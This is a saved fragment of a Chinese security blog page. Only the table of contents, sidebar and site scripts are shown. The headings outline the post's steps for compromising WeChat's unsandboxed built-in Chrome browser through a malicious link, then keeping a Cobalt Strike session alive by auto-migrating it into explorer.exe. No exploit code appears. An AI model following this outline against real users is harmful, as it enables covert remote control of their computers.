href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%9C%80%E8%BF%91%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E7%88%86%E5%87%BA%E4%BA%86%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E5%A4%84%E9%83%BD%E6%98%AF%E5%B0%B1%E4%B8%8D%E8%B5%98%E8%BF%B0%E4%BA%86%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%BE%AE%E4%BF%A1%E8%B0%83%E7%94%A8%E4%BA%86%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8%E8%80%8C%E4%B8%94%E9%BB%98%E8%AE%A4%E6%B2%A1%E5%BC%80%E6%B2%99%E7%9B%92%E6%A8%A1%E5%BC%8F%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E" data-pjax-state=""><span class="toc-number">1.0.1.</span> <span class="toc-text"> 最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E4%BD%86%E6%98%AF%E7%88%86%E5%87%BA%E6%9D%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%98%AF%E4%BE%9D%E8%B5%96%E5%9C%A8%E5%BE%AE%E4%BF%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BF%9B%E7%A8%8B%E4%B8%8A%E7%9A%84%EF%BC%8C%E5%AF%B9%E6%96%B9%E7%82%B9%E5%87%BB%E6%81%B6%E6%84%8F%E9%93%BE%E6%8E%A5%E5%90%8E%E5%8F%AF%E6%AD%A3%E5%B8%B8%E4%B8%8A%E7%BA%BF%E5%8F%AF%E6%98%AF%E4%B8%80%E6%97%A6%E5%85%B3%E9%97%AD%E5%86%85%E7%BD%AE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B0%B1%E4%BC%9A%E5%A4%B1%E5%8E%BB%E6%8E%A7%E5%88%B6%E6%9D%83" data-pjax-state=""><span class="toc-number">1.0.2.</span> <span class="toc-text"> 但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E8%A7%A3%E5%86%B3%E4%B8%8A%E8%BF%B0%E9%97%AE%E9%A2%98" data-pjax-state=""><span class="toc-number">1.1.</span> <span class="toc-text"> 解决上述问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#1-%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%AE%9A%E4%B9%89-malleable-C2%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-%E4%BB%8E%E8%80%8C%E8%BE%BE%E5%88%B0%E4%B8%BB%E6%9C%BA%E4%B8%80%E4%B8%8A%E7%BA%BF%E8%B7%B3%E9%BB%98%E8%AE%A4%E4%B8%BA1%E7%A7%92%EF%BC%8C%E5%B0%B1%E5%8F%AF%E8%87%AA%E5%8A%A8%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%89%93%E5%BC%80%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9F%AD%E6%9A%82%E7%9A%84%E6%97%B6%E9%97%B4%E9%87%8C%E5%B0%BD%E5%BF%AB%E8%BD%AC%E7%A7%BB%E8%BF%9B%E7%A8%8B" data-pjax-state=""><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 加载自定义 malleable C2 配置文件 从而达到主机一上线跳默认为 1 秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#2-%E5%8A%A0%E8%BD%BD%E4%B8%80%E4%B8%AA-Cobalt-Strike-automigrate%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8F%92%E4%BB%B6%E4%BB%8E%E8%80%8C%E8%BE%BE%E5%88%B0%E7%9B%AE%E6%A0%87%E4%B8%8A%E7%BA%BF%E5%90%8E%E4%BC%9A%E8%AF%9D%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E5%88%B0%E5%85%B6%E4%BB%96%E8%BF%9B%E7%A8%8B%E4%BB%8E%E8%80%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%84%B1%E7%A6%BB%E5%BE%AE%E4%BF%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E6%9D%9F%E7%BC%9A" data-pjax-state=""><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 加载一个 Cobalt Strike automigrate 自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚</span></a></li></ol></li><li class="toc-item toc-level-2 active"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C" data-pjax-state=""><span class="toc-number">1.2.</span> <span class="toc-text"> 具体操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3 active"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#1-%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%AE%9A%E4%B9%89-malleable-C2%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6" data-pjax-state=""><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 加载自定义 malleable C2 配置文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%9C%A8%E6%AD%A4%E9%A1%B9%E7%9B%AE%E4%B8%8A%E6%89%BE%E5%88%B0%E4%BD%A0cs%E7%89%88%E6%9C%AC%E5%AF%B9%E5%BA%94%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%8C%E6%88%91%E8%BF%99%E9%87%8C%E7%94%A8%E7%9A%844-0-%E5%90%84%E7%89%88%E6%9C%AC%E5%B7%AE%E5%88%AB%E4%B8%8D%E5%A4%A7" data-pjax-state=""><span class="toc-number">1.2.1.1.</span> <span class="toc-text"> 在此项目上找到你 cs 版本对应的配置文件，我这里用的 4.0 各版本差别不大</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80-%EF%BC%9A-jquery-c2-4-0-profile" data-pjax-state=""><span class="toc-number">1.2.1.2.</span> <span class="toc-text"> 下载地址  ： jquery-c2.4.0.profile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E4%BF%AE%E6%94%B9%E5%A5%BD%E5%90%8E%E4%B8%A2%E5%88%B0%E6%9C%8D%E5%8A%A1%E7%AB%AF" data-pjax-state=""><span class="toc-number">1.2.1.3.</span> <span class="toc-text"> 修改好后丢到服务端</span></a></li><li class="toc-item toc-level-4 active"><a class="toc-link active" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#2-%E5%8A%A0%E8%BD%BD%E4%B8%80%E4%B8%AA-Cobalt-Strike-automigrate%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%8F%92%E4%BB%B6" data-pjax-state=""><span class="toc-number">1.2.1.4.</span> <span class="toc-text">2. 加载一个 Cobalt Strike automigrate 自动迁移进程的插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%A4%8D%E5%88%B6%E5%88%B0%E6%9C%AC%E5%9C%B0%E4%BF%9D%E5%AD%98%E6%88%90%E4%B8%80%E4%B8%AA-cna%E6%96%87%E4%BB%B6%E4%BD%BF%E7%94%A8cobaltstrike%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6%E5%B0%B1%E5%8F%AF" data-pjax-state=""><span class="toc-number">1.2.1.5.</span> <span class="toc-text"> 复制到本地保存成一个.cna 文件使用 cobaltstrike 加载插件就可</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%B5%8B%E8%AF%95%EF%BC%9A" data-pjax-state=""><span class="toc-number">1.3.</span> <span class="toc-text"> 测试：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#1-%E5%87%86%E5%A4%87%E6%96%87%E4%BB%B6" data-pjax-state=""><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 准备文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9B%91%E5%90%AC%E5%99%A8" data-pjax-state=""><span class="toc-number">1.3.1.1.</span> <span class="toc-text"> 新建一个监听器</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E7%9B%91%E5%90%AC%E5%99%A8%E5%90%8D%E5%AD%97%E4%B8%80%E5%AE%9A%E8%A6%81%E8%AE%BE%E7%BD%AE%E6%88%90test" data-pjax-state=""><span class="toc-number">1.3.1.1.0.1.</span> <span class="toc-text"> 监听器名字一定要设置成 test</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAshellcode" data-pjax-state=""><span class="toc-number">1.3.1.2.</span> <span class="toc-text"> 生成一个 shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%9B%BF%E6%8D%A2js%E4%BB%A3%E7%A0%81%E9%87%8C%E7%9A%84shellcode" data-pjax-state=""><span class="toc-number">1.3.1.3.</span> <span class="toc-text"> 替换 js 代码里的 shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAhtml%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8js" data-pjax-state=""><span class="toc-number">1.3.1.4.</span> <span class="toc-text"> 创建一个 html 文件调用 js</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#2-%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1" data-pjax-state=""><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 搭建服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E9%9A%8F%E4%BE%BF%E6%8B%BF%E4%BB%80%E4%B9%88%E6%90%AD%E9%83%BD%E5%8F%AF%E4%BB%A5-%E6%88%91%E7%9B%B4%E6%8E%A5%E7%94%A8hfs%E6%90%AD%E5%BB%BA%E4%B8%8B" data-pjax-state=""><span class="toc-number">1.3.2.1.</span> <span class="toc-text"> 随便拿什么搭都可以 我直接用 hfs 搭建下</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E6%B5%8B%E8%AF%95%E4%B8%8A%E7%BA%BF%E4%B8%8E%E8%BF%9B%E7%A8%8B%E8%BD%AC%E7%A7%BB%E6%95%88%E6%9E%9C" data-pjax-state=""><span class="toc-number">1.3.3.</span> <span class="toc-text"> 测试上线与进程转移效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#%E8%80%8C%E8%BD%AC%E7%A7%BB%E5%88%B0explorer-exe%E7%9A%84%E4%BC%9A%E8%AF%9D%E4%BE%9D%E7%84%B6%E5%9D%9A%E6%8C%BA%EF%BC%81" data-pjax-state=""><span class="toc-number">1.3.4.</span> <span class="toc-text"> 而转移到 explorer.exe 的会话依然坚挺！</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="https://ailiqun.xyz/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" title="在线工具汇总" data-pjax-state=""><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post.webp" onerror="this.onerror=null;this.src=&#39;/img/404.jpg&#39;" alt="在线工具汇总" data-ll-status="loaded" class="entered loaded" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/post.webp"></a><div class="content"><a class="title" href="https://ailiqun.xyz/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" title="在线工具汇总" data-pjax-state="">在线工具汇总</a><time datetime="2022-07-24T12:13:00.000Z" title="发表于 2022-07-24 20:13:00"> 2022-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/" title="关于微信内置浏览器 达到持久控制" data-pjax-state=""><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post3.webp" onerror="this.onerror=null;this.src=&#39;/img/404.jpg&#39;" alt="关于微信内置浏览器 达到持久控制" data-ll-status="loaded" class="entered loaded" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/post3.webp"></a><div class="content"><a class="title" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/" title="关于微信内置浏览器 达到持久控制" data-pjax-state="">关于微信内置浏览器 达到持久控制</a><time datetime="2021-04-18T08:56:00.000Z" title="发表于 2021-04-18 16:56:00"> 2021-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="https://ailiqun.xyz/2021/04/16/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/" title="Web常见漏洞描述及修复建议" data-pjax-state=""><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post5.webp" onerror="this.onerror=null;this.src=&#39;/img/404.jpg&#39;" alt="Web常见漏洞描述及修复建议" class="entered loaded" data-ll-status="loaded" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/post5.webp"></a><div class="content"><a class="title" href="https://ailiqun.xyz/2021/04/16/Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE/" title="Web常见漏洞描述及修复建议" data-pjax-state="">Web 常见漏洞描述及修复建议</a><time datetime="2021-04-15T16:58:00.000Z" title="发表于 2021-04-16 00:58:00"> 2021-04-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="https://ailiqun.xyz/2021/04/13/%E7%BD%91%E5%BA%B7%E9%98%B2%E7%81%AB%E5%A2%99-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="网康下一代防火墙   命令执行" data-pjax-state=""><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post7.webp" onerror="this.onerror=null;this.src=&#39;/img/404.jpg&#39;" alt="网康下一代防火墙   命令执行" class="entered loaded" data-ll-status="loaded" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/post7.webp"></a><div class="content"><a class="title" href="https://ailiqun.xyz/2021/04/13/%E7%BD%91%E5%BA%B7%E9%98%B2%E7%81%AB%E5%A2%99-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="网康下一代防火墙   命令执行" data-pjax-state="">网康下一代防火墙   命令执行</a><time datetime="2021-04-13T12:59:00.000Z" title="发表于 2021-04-13 20:59:00"> 2021-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="https://ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/" title="致远OA 组合getshell" data-pjax-state=""><img data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post5.webp" onerror="this.onerror=null;this.src=&#39;/img/404.jpg&#39;" alt="致远OA 组合getshell"></a><div class="content"><a class="title" href="https://ailiqun.xyz/2021/04/10/%E8%87%B4%E8%BF%9COA-%E7%BB%84%E5%90%88getshell/" title="致远OA 组合getshell" data-pjax-state="">致远 OA 组合 getshell</a><time datetime="2021-04-10T10:13:00.000Z" title="发表于 2021-04-10 18:13:00">2021-04-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">©2020 - 2021 By Li qun</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a><span class="footer-separator">|</span><span> 主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside" style="opacity: 1; transform: translateX(-38px);"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/#post-comment" title="直达评论" data-pjax-state=""><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/utils.js"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/main.js"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/local-search.js"></script><div class="js-pjax"><script async="async">var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})
+setTimeout(function(){preloader.endLoading();}, 3000);</script></div><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'LHEeV46JNDnW2PY1KjVTLy2J-MdYXbMMI',
+      appKey: 'XESiWusPnVBEz6s4AhXF6ONB',
+      placeholder: '说点什么吗',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-cn',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/订阅.js"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/av-min.js"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/mouse_snow.min.js"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/动态标题.js"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/jquery.min.js"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/1613835026120" id="myhk" key="1613835026120" m="1"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/click-show-text.min.js" data-mobile="false" data-text="暴富" data-fontsize="15px" data-random="false" async="async"></script><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  if (typeof gtag === 'function') {
+    gtag('config', '', {'page_path': window.location.pathname});
+  }
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+
+document.addEventListener('pjax:send', function () {
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script></div><canvas width="1440" height="678" style="position: fixed; top: 0px; left: 0px; pointer-events: none; z-index: 999999;"></canvas><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script><script>(function (w, d, s, id) {
